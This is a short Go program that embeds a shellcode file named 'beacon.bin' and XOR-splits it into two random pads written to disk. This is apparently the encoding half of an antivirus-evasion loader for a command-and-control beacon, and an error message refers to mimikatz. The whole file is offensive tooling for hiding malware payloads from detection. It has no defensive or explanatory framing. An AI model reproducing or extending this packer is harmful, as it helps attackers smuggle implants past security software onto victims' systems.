package main

import (
	"bytes"
	_ "embed"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"path"
	"runtime"
	"time"
)

var exePrefix, outputSuffix, outputPath, stub string

//go:embed beacon.bin
var shellcodeByte []byte

func init() {
	switch runtime.GOARCH {
	case "amd64":
		exePrefix = "x64"
		outputSuffix = "_amd64"
	case "386", "amd64p32":
		exePrefix = "Win32"
		outputSuffix = "_386"
	default:
		fmt.Println("This arch is not compatible with mimikatz")
		os.Exit(0)
	}

	flag.StringVar(&outputPath, "o", "", "where to put the pads")
	flag.Parse()
	if len(outputPath) < 1 {
		flag.Usage()
		os.Exit(0)
	}
}

func checkFatalErr(err error) {
	if err != nil {
		panic(err)
	}
}

func main() {

	shellcode := bytes.NewBuffer(shellcodeByte)
	pad1 := make([]byte, len(shellcode.Bytes()))
	pad2 := make([]byte, len(shellcode.Bytes()))
	rand.Seed(time.Now().UnixNano())
	for index, shellcodeByte := range shellcode.Bytes() {
		pad1[index] = byte(rand.Int())
		pad2[index] = pad1[index] ^ shellcodeByte
	}

	checkFatalErr(ioutil.WriteFile(path.Join(outputPath, "pad1"), pad1, 0777))
	checkFatalErr(ioutil.WriteFile(path.Join(outputPath, "pad2"), pad2, 0777))
}
